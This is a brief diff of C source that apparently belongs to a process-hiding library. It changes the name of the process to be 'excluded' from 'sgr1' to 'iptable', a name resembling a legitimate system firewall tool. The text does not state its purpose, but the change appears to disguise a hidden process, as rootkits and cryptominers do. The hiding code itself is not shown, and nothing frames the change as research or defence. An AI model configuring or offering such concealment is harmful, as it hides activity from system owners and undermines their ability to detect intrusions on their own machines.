@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "sgr1";
+static const char* process_to_filter = "iptable";
 
 /*
  * Get a directory name given a DIR* handle
